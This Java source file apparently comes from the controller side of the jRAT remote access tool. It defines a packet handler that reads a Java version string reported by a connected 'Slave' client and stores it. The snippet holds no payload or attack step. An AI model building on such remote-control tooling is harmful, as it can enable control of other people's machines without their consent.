package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;


public class Packet9InitJavaVersion extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setJavaVersion(version);
	}
}
